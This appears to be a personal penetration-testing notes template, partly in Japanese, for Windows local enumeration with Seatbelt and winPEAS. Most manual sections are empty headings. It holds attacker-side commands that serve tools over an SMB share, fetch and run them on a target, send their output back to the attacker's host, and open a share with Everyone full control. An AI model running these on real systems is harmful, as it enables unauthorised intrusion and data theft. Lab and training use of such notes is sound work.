# Local

## Auto w/ [Seatbelt](https://github.com/GhostPack/Seatbelt)

### 転送・実行

```zsh
# Attacker
mkdir share
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Seatbelt.exe -O share/Seatbelt.exe
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
net use \\192.168.49.104\share /user:username pw
cp \\192.168.49.104\share\Seatbelt.exe .
.\Seatbelt.exe -group=all | Tee-Object -FilePath \\192.168.49.104\share\seatbelt_result.txt
```

### 実行結果抽出

```powershell

```


## Auto w/ [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

### 転送・実行

listenrがうまくいかないので、base64 encodeして強制的に転送しようとしたけど無理だったので、WK26でshareを作成
```powershell
Invoke-WebRequest -Uri http://192.168.49.104:443/winPEASx64.exe -Outfile .\WinPEASx64.exe

# フォルダの作成
mkdir C:\PublicShare

# 共有の設定（Everyoneにフルコントロールを付与）
net share Transfer=C:\PublicShare /grant:Everyone,FULL

# フォルダ自体の権限をEveryoneフルコントロールに
icacls C:\PublicShare /grant "Everyone:(OI)(CI)F" /T
```

```sh
copy \\172.16.104.206\Transfer\WinPEASx64.exe .
```
```powershell
.\winPEASx64.exe | Tee-Object -FilePath \\172.16.104.206\Transfer\peas_result.txt
```

### 実行結果抽出

```powershell

```

---
---

## Manual

### ユーザー



---

### システム情報


---

### ネットワーク


---

### インストール済みアプリケーション


---

### 実行中のプロセス


---

### PowerShellログ


---

### サービス


---

### スケジュールタスク


---

### 興味深い情報


---
---

# WinPEAS結果抽出（長文注意）